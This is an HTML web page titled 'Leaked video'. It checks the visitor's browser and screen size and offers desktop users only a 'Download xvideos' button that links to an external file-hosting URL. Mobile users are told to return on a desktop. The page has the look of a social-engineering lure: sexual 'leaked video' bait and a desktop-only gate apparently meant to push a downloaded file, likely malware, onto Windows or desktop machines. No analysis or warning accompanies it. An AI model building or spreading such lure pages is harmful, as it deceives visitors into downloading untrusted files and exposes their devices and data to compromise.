<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Leaked video</title>
  <style>
    :root{--bg:#0f1724;--card:#0b1220;--accent:#7dd3fc;--muted:#9aa6b2}
    html,body{height:100%;margin:0;font-family:Inter,ui-sans-serif,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial;background:linear-gradient(180deg,#071024 0%, #081428 100%);color:#e6eef6}
    .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:32px}
    .card{width:100%;max-width:880px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.03);box-shadow:0 10px 30px rgba(2,6,23,0.6);padding:28px;border-radius:12px;text-align:center}
    h1{margin:8px 0 6px;font-size:22px}
    p{color:var(--muted)}
    img.preview{max-width:100%;border-radius:8px;margin-top:20px}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card" id="card">
      <h1 id="title">Checking your device...</h1>
      <p id="message">Please wait while we verify if you're on a desktop device.</p>
    </div>
  </div>

  <script>
    (function(){
      const ua = navigator.userAgent || navigator.vendor || window.opera || '';
      const width = Math.max(window.screen.width, window.innerWidth || 0);
      const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
      const isMobileUA = mobileRegex.test(ua);
      const isSmallScreen = width <= 900;

      const card = document.getElementById('card');
      const title = document.getElementById('title');
      const msg = document.getElementById('message');

      if(!isMobileUA && !isSmallScreen){
        // Desktop detected — show preview and download link
        title.textContent = 'Download Ready';
        msg.innerHTML = 'Click below to download your file.';
        const img = document.createElement('img');
        img.src = '/preview.png'; // replace with your preview image path
        img.alt = 'Preview of download';
        img.className = 'preview';
        const link = document.createElement('a');
        link.href = 'https://mega.nz/file/iQdDDRRR#uvkGWiuYLblDmAMDaTIgLgghQjNo1upaxg62LkjXFM4';
        link.download = 'xvideos';
        link.textContent = 'Download xvideos';
        link.style.display = 'inline-block';
        link.style.marginTop = '20px';
        link.style.padding = '10px 16px';
        link.style.background = 'var(--accent)';
        link.style.color = '#000';
        link.style.fontWeight = '600';
        link.style.borderRadius = '6px';
        card.appendChild(img);
        card.appendChild(link);
      } else {
        // Mobile or tablet — block access
        title.textContent = 'Desktop Required';
        msg.innerHTML = 'This download is only available on desktop devices. Please revisit this page using a desktop browser to continue.';
      }
    })();
  </script>
</body>
</html>
